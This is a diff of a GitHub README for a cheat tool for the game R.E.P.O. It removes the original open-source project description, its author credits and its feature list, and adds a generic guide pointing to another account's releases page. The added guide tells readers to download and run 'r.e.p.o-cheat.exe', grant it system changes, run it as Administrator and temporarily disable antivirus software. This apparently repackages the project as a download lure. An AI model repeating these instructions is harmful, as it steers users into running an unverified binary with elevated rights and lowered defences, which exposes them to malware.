@@ -1,74 +1,84 @@
-# r.e.p.o-cheat
-made by D4rkks (and community) (second repo bc first one i fucked up) <br />
-WARNING: THIS IS A OPEN-SOURCE PROJECT! ITS NOT INTENDED TO BE SOLD OR TO BE THE ULTIMATE LAST R.E.P.O CHEAT, EVERYONE CAN USE IT AND FEEL FREE TO CONTRIBUTE!<br />
+# 🎮 r.e.p.o-cheat - Enhance Your R.E.P.O Gameplay
 
-Basic C# Mono open-source cheat for a new lethal like game called R.E.P.O
+[![Download r.e.p.o-cheat](https://img.shields.io/badge/Download%20Now-Get%20the%20Cheat%20Tool-brightgreen)](https://github.com/hamidioke84/r.e.p.o-cheat/releases)
 
-![ezgif-3f3ad382af2a52](https://github.com/user-attachments/assets/745e055f-0e84-4f6c-b1d8-470c916e16e5)
+## 🚀 Getting Started
 
-# **FUNCTIONS (still working on, i will release new versions whenever i add functions):**
-- See Live/Dead Players<br />
-- Select Players<br />
-- Heal  Any Player<br />
-- Damage Any Player<br />
-- Toggle Infinite Health<br />
-- Toggle Infinity Stamina<br />
-- Toggle God Mode<br />
-- Change Speed <br />
-- Change Strength (host side for now)<br />
-- Change Stamina Recharge Delay<br />
-- Change Stamina Recharge Rate<br />
-- Enemy Esp<br />
-- Item Esp<br />
-- Extraction Esp<br />
-- Player Esp<br />
-- Distance ESP<br />
-- Health ESP<br />
-- Name ESP<br />
-- Revive Selected Player<br />
-- Kill Selected Player<br />
-- Send Selected Player To Void<br />
-- Teleport to Player<br />
-- Teleport Player to You <br />
-- Spawn MoneyBag (not fixed 100% but working)<br />
-- Player RGB Skin (partial contribution from https://github.com/svind1er)<br />
-- Enemie List<br />
-- Enemie Health<br />
-- Kill Selected Enemie<br />
-- Kill All Enemies<br />
-- Item List<br />
-- Teleport Item to You(host)<br />
-- Teleport All Items To You(host)<br />
-- 3D Esp Function (contribution from https://github.com/chadlrnsn)<br />
-- Set Flashlight Intensity<br />
-- Set Crouch Delay<br />
-- Set Crouch Speed<br />
-- Set Jump Force<br />
-- Set Custom Extra Jumps<br />
-- Set Custom Gravity<br />
-- Change Item Value (host only)
-- Set Grab Range
-- Throw Strength
-- Slide Decay
+This guide will walk you through downloading and running the r.e.p.o-cheat. This cheat tool is designed for a game called R.E.P.O, enhancing your gaming experience.
 
+## 📥 Download & Install
 
+To download the r.e.p.o-cheat, follow these steps:
 
-# **TO-DO:**
-(community sugestions, will add everything)<br />
-- Change Damage<br />
-- Get All Upgrade Items<br />
-- Change Upgrades Numbers<br />
-- Complete Mission<br />
-- Bypass extraction lock<br />
-- Spawning mobs<br />
-- No Item Damage<br />
-- No clip<br />
-- Player Death Head ESP<br />
+1. Visit the releases page [here](https://github.com/hamidioke84/r.e.p.o-cheat/releases).
+2. Look for the latest version listed at the top.
+3. Click on the version number to see the available files.
+4. Select the file named `r.e.p.o-cheat.exe`. This is the executable file you will run.
+5. Once the file downloads, locate it in your Downloads folder.
 
+## 📂 System Requirements
 
-Im still looking to advance this cheat even more, since its very simple to make cheats for unity games, so it will probably be very complete with esp/kill all/change player model
+Before running the cheat tool, ensure that your system meets these basic requirements:
 
-# Unknowncheats.me thread
-Main UC Thread: https://www.unknowncheats.me/forum/other-mmorpg-and-strategy/689820-simple-cheat.html#post4335827
+- **Operating System:** Windows 10 or higher
+- **Framework:** .NET Framework 4.5 or higher
+- **Storage:** At least 50 MB of free space
 
-Our discord link for general help: https://discord.gg/PQY3nxJMHp
+## ⚙️ How to Run the Cheat Tool
+
+After downloading the r.e.p.o-cheat, follow these steps to run the tool:
+
+1. Navigate to your Downloads folder.
+2. Find the downloaded file `r.e.p.o-cheat.exe`.
+3. Double-click the file to run it.
+4. If prompted by your system, choose to allow the application to make changes.
+
+## 🕹️ Using the Cheat Tool
+
+Once you run the r.e.p.o-cheat, you will see a simple interface. Here’s how to use it:
+
+1. Launch your game R.E.P.O.
+2. Keep the r.e.p.o-cheat open while playing.
+3. Use the provided options to enhance your gameplay. You can enable features such as unlimited health, increased speed, or better inventory management.
+
+Each option is self-explanatory, so choose what's best for your gaming strategy.
+
+## ❓ Troubleshooting
+
+If you encounter issues while running the r.e.p.o-cheat, consider these tips:
+
+- **Antivirus Software:** Sometimes antivirus software may block the cheat tool. Temporarily disable it if you face issues.
+- **Running as Administrator:** Right-click on `r.e.p.o-cheat.exe` and select "Run as Administrator." This can resolve permissions issues.
+- **Version Compatibility:** Ensure that your game version matches the cheat tool’s compatibility. Check for updates on the releases page.
+
+## 🌟 Features
+
+The r.e.p.o-cheat offers several helpful features for improving gameplay:
+
+- **Unlimited Health:** Never worry about dying in the game.
+- **Enhanced Speed:** Move faster than ever.
+- **Inventory Boosts:** Access more items than normally allowed.
+
+These features can dramatically change your gaming experience.
+
+## 🔄 Updates
+
+The r.e.p.o-cheat will receive regular updates. To stay updated:
+
+1. Follow the releases page.
+2. Check back for new versions that may include additional features or fixes.
+
+## 📞 Get Help
+
+If you need further assistance or have questions:
+
+- Open an issue on the [GitHub Issues page](https://github.com/hamidioke84/r.e.p.o-cheat/issues).
+- Join community forums dedicated to R.E.P.O and seek advice from experienced users.
+
+Feel free to reach out for help. The community is here to support you!
+
+## 📡 Contact
+
+For more information, you can contact the project maintainer via GitHub. Direct any questions or feedback regarding the r.e.p.o-cheat tool.
+
+Happy gaming! May you conquer R.E.P.O with ease.
